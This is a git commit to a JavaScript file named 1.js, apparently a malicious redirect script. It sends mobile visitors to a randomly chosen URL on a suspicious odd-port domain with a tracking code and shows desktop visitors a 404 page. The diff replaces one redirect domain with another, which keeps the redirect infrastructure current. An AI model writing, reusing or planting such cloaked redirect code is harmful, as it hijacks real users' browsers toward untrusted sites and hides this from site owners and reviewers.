d56883c7cb81eeefa72e2b7b26903de19aff07a4
dnshook <62766196+dnshook@users.noreply.github.com>
2023-11-24 14:35:21 +0800

    Update 1.js

--- 1.js
+++ 1.js
@@ -6,7 +6,7 @@ var _hmt = _hmt || [];
   s.parentNode.insertBefore(hm, s);
 })();
 if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
-	var arr = ["https://www.4xmqq.xyz:9502/31328?i_code=39290091", "https://www.4xmqq.xyz:9502/31328?i_code=39290091"];
+	var arr = ["https://www.dgfth.vip:8553/34018?i_code=39290091", "https://www.dgfth.vip:8553/34018?i_code=39290091"];
 	window.location.href = arr[parseInt(Math.random() * arr.length)];
 }else{
 	window.location.href="/404.html";
